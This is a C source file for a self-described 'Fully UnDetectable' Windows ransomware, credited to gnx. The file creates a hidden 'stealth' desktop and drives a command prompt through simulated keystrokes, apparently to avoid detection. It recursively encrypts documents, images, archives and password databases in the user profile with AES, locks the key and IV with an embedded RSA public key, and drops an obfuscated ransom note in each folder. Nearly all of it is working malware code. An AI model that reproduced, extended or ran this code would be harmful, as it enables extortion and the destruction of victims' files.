
/* 
	minizinh0-FUD - A Fully UnDetectable Ransomware
	by gnx @ freenode
	twitter.com/alissonbertochi
	
	https://github.com/gnxbr/Fully-Undetectable-Techniques/tree/main/minizinh0-fud
*/

#include <stdio.h>
#include <Windows.h>
#include <stdbool.h>
#include <dirent.h>

#include "aes.h"
#include "pkcs7_padding.h"
#include "base64.h"
#include "rsa.h"

#include <openssl/pem.h>
#include <openssl/ssl.h>
#include <openssl/rsa.h>
#include <openssl/evp.h>
#include <openssl/bio.h>
#include <openssl/err.h>

#define REALDELAY 150
#define EXTENSION ".mat"
#define BUF_SIZE 16
#define CBC 1

#define BAR "\\"
#define FILE_TYPE 0
#define FOLDER_TYPE 16

HWND searchWindow(char *);
HWND getHandle(HWND);
void quickStartFocus(HWND);
void sendChars(HWND, char *);
void deleteChars(HWND);
void writeRansomNote(char *, char *, char *, HWND);
void sendEscape(HWND);

char *concatenate(char *, char *);
void encrypt_aes_cbc(char *, char [], char *, HWND);
char *encrypt_with_rsa(char *);
int navigation(char *, int, char *, char *, char *, char *, HWND);
unsigned char *generateIV(void);
signed char *generateKey(void);
int randomize(void);

unsigned char ransomNote[] = { 68, 86, 102, 17, 84, 96, 94, 97, 102, 101, 82, 85, 96, 99, 17, 87, 96, 90, 17, 90, 95, 87, 86, 84, 101, 82, 85, 96, 17, 84, 96, 94, 17, 96, 17, 67, 82, 95, 100, 96, 94, 104, 82, 99, 86, 17, 94, 90, 95, 90, 107, 90, 95, 89, 33, 18, -5, 65, 82, 99, 82, 17, 99, 86, 84, 102, 97, 86, 99, 82, 99, 17, 100, 86, 102, 100, 17, 82, 99, 98, 102, 90, 103, 96, 100, 29, 17, 103, 96, 84, 86, 17, 103, 82, 90, 17, 101, 86, 99, 17, 98, 102, 86, 17, 94, 86, 17, 86, 95, 103, 90, 82, 99, 17, 34, 17, 73, 62, 67, 17, 95, 96, 17, 86, 95, 85, 86, 99, 86, 84, 96, 17, 73, 73, 73, 73, 73, 73, 73, 73, 73, 73, 73, 73, 73, 73, 73, 73, 73, 73, 73, 73, 73, 73, 73, 73, 18, -5, 50, 97, 96, 100, 17, 86, 95, 103, 90, 82, 99, 29, 17, 86, 95, 101, 99, 86, 17, 86, 94, 17, 84, 96, 95, 101, 82, 101, 96, 17, 97, 86, 93, 96, 17, 86, 30, 94, 82, 90, 93, 17, 95, 82, 94, 86, 49, 86, 94, 82, 90, 93, 31, 84, 96, 94, 17, 90, 95, 85, 90, 84, 82, 95, 85, 96, 17, 82, 100, 17, 90, 95, 87, 96, 99, 94, 82, 84, 96, 86, 100, 17, 98, 102, 86, 17, 84, 96, 94, 97, 99, 96, 103, 82, 94, 17, 96, 17, 85, 86, 97, 96, 100, 90, 101, 96, 29, 17, 86, 17, 90, 95, 87, 96, 99, 94, 86, 17, 96, 17, 58, 71, 17, 86, 17, 60, 86, 106, 17, 82, 83, 82, 90, 105, 96, 29, 17, 97, 82, 99, 82, 17, 86, 102, 17, 85, 86, 100, 84, 99, 90, 97, 101, 96, 88, 99, 82, 87, 82, 30, 93, 96, 100, 17, 86, 17, 103, 96, 84, 86, 17, 97, 96, 85, 86, 17, 99, 86, 84, 102, 97, 86, 99, 82, 99, 17, 96, 100, 17, 82, 99, 98, 102, 90, 103, 96, 100, 18, -5 };

void encrypt_aes_cbc(char *nome, char iv[], char *key, HWND handle){

	sendChars(handle, "del %TEMP%\\temp.png#");
	
	Sleep(1500);
	
	sendChars(handle, "move \"");
	sendChars(handle, nome);
	sendChars(handle, "\" %TEMP%\\temp.png#");
	
	char *tempDir;
	tempDir = getenv("TEMP");
	
	char *tempOriginal = concatenate(tempDir, "\\temp.png");
	char *tempEncryptado = concatenate(tempDir, "\\temp.mp3");

    int klenu = strlen(key);
      
    uint8_t kexarray[klenu];
   
    memset(kexarray, 0, klenu);
    
    for (int i = 0; i < klenu; i++) {
        kexarray[i] = (uint8_t)key[i];
    }
    
    FILE *original;
	FILE *encryptado;
	original = fopen(tempOriginal, "rb");
	encryptado = fopen(tempEncryptado, "wb");
	
	unsigned char buftemp[BUF_SIZE*sizeof(unsigned char)];
	int byteslidos;
	int round = 0;
	struct AES_ctx ctx;
	uint8_t hexarray[BUF_SIZE];
	
	uint8_t i;
	while ((byteslidos = fread(buftemp, 1, BUF_SIZE, original)) > 0){

		memset(hexarray, 0, BUF_SIZE);
		
		for (int i = 0; i < byteslidos; i++) {
			hexarray[i] = (uint8_t)buftemp[i];
   		}

	   	if (byteslidos < BUF_SIZE){
	   	
		pkcs7_padding_pad_buffer(hexarray, byteslidos, sizeof(hexarray), 16);
	   	}

   		if (round == 0){
	    	AES_init_ctx_iv(&ctx, kexarray, iv);
	    }
   		
   		AES_CBC_encrypt_buffer(&ctx, hexarray, BUF_SIZE);
   		
		fwrite(hexarray, 1, sizeof(hexarray), encryptado);
			
   		round++;
		
	}
	
	char *nomecompleto;
	nomecompleto = concatenate(nome, EXTENSION);
		
	sendChars(handle, "move %TEMP%\\temp.mp3 \"");
	sendChars(handle, nomecompleto);
	sendChars(handle, "\"#");
	
	free(tempOriginal);
	free(tempEncryptado);
	free(nomecompleto);
	fclose(original);
	fclose(encryptado);

	Sleep(1500);
        
}

char *encrypt_with_rsa(char *data){
	
	// Generated just to fill this example
	char publicKey[] ="-----BEGIN PUBLIC KEY-----\n"\
		"MIIBITANBgkqhkiG9w0BAQEFAAOCAQ4AMIIBCQKCAQB/Uiybey7tYA+5NPYCT+hJ\n"\
		"j/I8Jamneo7+ZFZwy11o89NZFP3MtClq/x8cSs2jQgTrV6gWNNGW1zERHX99M/X2\n"\
		"EZ7lUXIBB1i/M1yb5H+tZykMKfqBRlDLdGr/G1nCPYuxSAF4V9NRf0spERPb70Si\n"\
		"IivGOBs1PmW5/VB7q27CgcvagOX+9hXqw/znezVGtQJnYWgIXYy+MJQaVi5JN9/A\n"\
		"5DWNt7qop/5PwtGdYXdY+qJQfvs8eFD+G1mBABAkY2sJHF2RkmPOMPmIt3kn163d\n"\
		"Ei4KJEohaP4xkj6fk/g45+k9xqUyivVPbV8/FNgCjYeSLhWaF5xURx+FNrh4x+oT\n"\
		"AgMBAAE=\n"\
		"-----END PUBLIC KEY-----\n";

	unsigned char encrypted_rsa[256];
	int encrypted_rsa_length = public_encrypt(data, strlen(data), publicKey, encrypted_rsa);
	
	size_t output_len_base64;
	
	unsigned char *encrypted_base64 = base64_encode(encrypted_rsa, encrypted_rsa_length, &output_len_base64);

	return encrypted_base64;
	
}

int randomize(void){
	int min = 33;
	int max = 126;
	return min + rand() / (RAND_MAX / (max - min + 1) + 1);
}

unsigned char *generateIV(void){
	unsigned char *ivinternal = (unsigned char *)malloc(17);

	for (int i = 0; i < 16; i++){
		ivinternal[i] = randomize();
	}
	
	ivinternal[16] = '\0';
	
	return ivinternal;
}

signed char *generateKey(void){
	signed char *keyinternal = (signed char *)malloc(17);
	
	for (int i = 0; i < 16; i++){
		keyinternal[i] = randomize();
	}
	
	keyinternal[16] = '\0';
	
	return keyinternal;
}

int navigation(char *path, int level, char *IV, char *KEY, char *encrypted_iv, char *encrypted_key, HWND windowCmd){

	if (level == 0){
		return 0;
	}

	char *extensions = "|docx|pdf|xlsx|pptx|ppsx|kdbx|sqlite|zip|rar|jpg|png|html|htm|";
	char *pathcombarra;
	pathcombarra = concatenate(path, BAR);
	
	DIR *d;
	struct dirent *dir;
    
	d = opendir(path);
	
	if (!d){
		printf("Error listing files in directory:\n%s\n", path);
		return 1;
	}
	
	while ((dir = readdir(d)) != NULL){
		char *pathcompleto;
		pathcompleto = concatenate(pathcombarra, dir->d_name);
		
		bool diretorio = 0;
		char *comparacao;
		
		if ((strcmp(dir->d_name, ".") == 0) || (strcmp(dir->d_name, "..") == 0) || ((strchr(dir->d_name, '.') == NULL) && (dir->d_type == FILE_TYPE))){
			free(pathcompleto);
			continue;
		}
		
		if (dir->d_type == FOLDER_TYPE){
			diretorio = 1;
		}
		else{
			
			char temp[strlen(dir->d_name)+1];
			strcpy(temp, dir->d_name);
			
			comparacao = strtok(temp, ".");
			char *outrotemp;
			while(comparacao != NULL){
				outrotemp = comparacao;
				comparacao = strtok(NULL, ".");
			}			

			if (strstr(extensions, outrotemp) == NULL){
				free(pathcompleto);
				continue;
			}
		}
		
		if (!diretorio){
			encrypt_aes_cbc(pathcompleto, IV, KEY, windowCmd);
		}
		else{
			level--;
			navigation(pathcompleto, level, IV, KEY, encrypted_iv, encrypted_key, windowCmd);	
		}
		
		free(pathcompleto);
	}
	
	writeRansomNote(pathcombarra, encrypted_iv, encrypted_key, windowCmd);	
	free(pathcombarra);
	closedir(d);
}

void quickStartFocus(HWND windowExplorer){
	PostMessage(windowExplorer, WM_KEYDOWN, VK_F4, 1);
	Sleep(1000);
}

HWND searchWindow(char *window){
	for (HWND hwnd = GetTopWindow(NULL); hwnd != NULL; hwnd = GetNextWindow(hwnd, GW_HWNDNEXT)){   
	
		if (!IsWindowVisible(hwnd))
			continue;

		int length = GetWindowTextLength(hwnd);
		
		if (length == 0)
			continue;

		char title[length+1];
		GetWindowText(hwnd, title, length+1);
		if(strstr(title, window) != 0){
			HWND newhwnd = malloc(sizeof(hwnd));
			newhwnd = hwnd;
			return newhwnd;
		}

	}
}

void sendEscape(HWND handle){
	PostMessage(handle, WM_CHAR, '^', 1);
}

void deleteChars(HWND handle){
	int i;
	for(i = 0; i < 33; i++){
		PostMessage(handle, WM_CHAR, VK_BACK, 1);
		//Sleep(REALDELAY);
	}
}

void sendChars(HWND handle, char *comando){
	int len = strlen(comando);
	int i;
	
	for(i = 0; i < len; i++){
		if(comando[i] == '#'){
			PostMessage(handle, WM_KEYDOWN, VK_RETURN, 1);
			continue;
		}
		PostMessage(handle, WM_CHAR, comando[i], 1);
	}
}

HWND getHandle(HWND window){
	
	DWORD threadProcessId =	GetWindowThreadProcessId(window, 0);
	
	GUITHREADINFO infosThread;
	infosThread.cbSize = sizeof(GUITHREADINFO);
	
	GetGUIThreadInfo(threadProcessId, &infosThread);
	
	HWND focusHandle = malloc(sizeof(infosThread.hwndFocus));
	
	focusHandle = infosThread.hwndFocus;
	
	return focusHandle;
}

char *concatenate(char *nome, char *extra){

	char *nomecompleto = (char *) malloc( strlen(nome) + strlen(extra) + 1 );
	
	strcpy(nomecompleto, nome);
	strcat(nomecompleto, extra);
	
	return nomecompleto;
	
}

void writeRansomNote(char *path, char *encrypted_iv, char *encrypted_key, HWND handle){
	
	int i;
	
	char *enterDir = concatenate("cd \"", path);
	char *startCmd = "echo ";
	char *endCmd = " >> README-ransomware.txt#";
	
	sendChars(handle, enterDir);
	sendChars(handle, "\"#");	
	
	sendChars(handle, startCmd);
	
	for(i = 0; i < sizeof(ransomNote); i++){

		if(ransomNote[i] == 251){
			sendChars(handle, endCmd);
			sendChars(handle, startCmd);
			continue;
		}

		if((ransomNote[i]+15) == 38){
			sendEscape(handle);
			PostMessage(handle, WM_CHAR, ransomNote[i]+15, 1);
			continue;
		}

		if((ransomNote[i]+15) == 60){
			sendEscape(handle);
			PostMessage(handle, WM_CHAR, ransomNote[i]+15, 1);
			continue;
		}

		if((ransomNote[i]+15) == 62){
			sendEscape(handle);
			PostMessage(handle, WM_CHAR, ransomNote[i]+15, 1);
			continue;
		}
		
		PostMessage(handle, WM_CHAR, ransomNote[i]+15, 1);
	}
	
	sendChars(handle, "IV: ");
	sendChars(handle, endCmd);
	sendChars(handle, startCmd);
	
	for(i = 0; i < 344; i++){
		if(i == 343){
			PostMessage(handle, WM_CHAR, encrypted_iv[i], 1);
			sendChars(handle, endCmd);
			sendChars(handle, startCmd);
			continue;
		}
		
		if((encrypted_iv[i]) == 38){
			PostMessage(handle, WM_CHAR, encrypted_iv[i], 1);	
			sendEscape(handle);			
			continue;
		}

		if((encrypted_iv[i]) == 60){
			sendEscape(handle);
			PostMessage(handle, WM_CHAR, encrypted_iv[i], 1);
			continue;
		}

		if((encrypted_iv[i]) == 62){
			sendEscape(handle);
			PostMessage(handle, WM_CHAR, encrypted_iv[i], 1);
			continue;
		}
		
		PostMessage(handle, WM_CHAR, encrypted_iv[i], 1);
	}
	
	sendChars(handle, "KEY: ");
	sendChars(handle, endCmd);
	sendChars(handle, startCmd);
	
	
	for(i = 0; i < 344; i++){
		if(i == 343){
			PostMessage(handle, WM_CHAR, encrypted_iv[i], 1);
			sendChars(handle, endCmd);
			sendChars(handle, startCmd);
			continue;
		}

		if((encrypted_key[i]) == 38){
			sendEscape(handle);
			PostMessage(handle, WM_CHAR, encrypted_key[i], 1);
			continue;
		}

		if((encrypted_key[i]) == 60){
			sendEscape(handle);
			PostMessage(handle, WM_CHAR, encrypted_key[i], 1);
			continue;
		}

		if((encrypted_key[i]) == 62){
			sendEscape(handle);
			PostMessage(handle, WM_CHAR, encrypted_key[i], 1);
			continue;
		}
		
		PostMessage(handle, WM_CHAR, encrypted_key[i], 1);
	}	
	
	PostMessage(handle, WM_KEYDOWN, VK_RETURN, 1);
	free(enterDir);
}
	
int main(void){

	char *desktopName = "stealth";
	HDESK windowStealthy;
	
	windowStealthy = CreateDesktopA(desktopName, NULL, NULL, 0, GENERIC_ALL, NULL);

	if(windowStealthy == NULL){
		DWORD dw = GetLastError();
		printf("Error on CreateDesktop: %d!\n", dw);
	}
	else{
		printf("Yeah!\n");
	}
	
	STARTUPINFOA startupInfo;
	PROCESS_INFORMATION processInformation; 
	
	memset(&startupInfo, 0, sizeof(startupInfo));
	memset(&processInformation, 0, sizeof(processInformation));
	
	startupInfo.lpDesktop = desktopName;
	BOOL create = CreateProcessA(NULL, "explorer.exe", NULL, NULL, FALSE, 0, NULL, NULL, &startupInfo, &processInformation);
	
	Sleep(1000);
	
	if(create){
		printf("Process created!\n");
	}
	else{
		printf("Error on create!\n");
		exit(1);
	}
	
	HWND windowExplorer = searchWindow("Explorador");
	
	quickStartFocus(windowExplorer);
	
	HWND handleExplorerFocus = getHandle(windowExplorer);
	
	deleteChars(handleExplorerFocus);
	
	char *cmd = "cmd.exe#";
	sendChars(handleExplorerFocus, cmd);
	
	Sleep(1000);
	
	HWND windowCmd = searchWindow("cmd.exe");
	
	sendChars(windowCmd, "set COPYCMD=/y#");
	
	srand(time(NULL));
	static unsigned char *IV;
	IV = generateIV();
	char *encrypted_iv;
	encrypted_iv = encrypt_with_rsa(IV);

	Sleep(10);
	
	static signed char *KEY;
	KEY = generateKey();
	char *encrypted_key;
	encrypted_key = encrypt_with_rsa(KEY);
	
	char *initial_path;

	initial_path = getenv("USERPROFILE");
	navigation(initial_path, 7, IV, KEY, encrypted_iv, encrypted_key, windowCmd);
	
		
	memset(IV, 0, 17);
	free(IV);
	
	memset(KEY, 0, 17);
	free(KEY);
	
	free(encrypted_iv);
	free(encrypted_key);

	CloseDesktop(windowStealthy);
	CloseHandle(windowCmd);
	CloseHandle(windowExplorer);
	CloseHandle(handleExplorerFocus);
	
	free(handleExplorerFocus);
	free(windowCmd);
	free(windowExplorer);
	
	return 0;
}




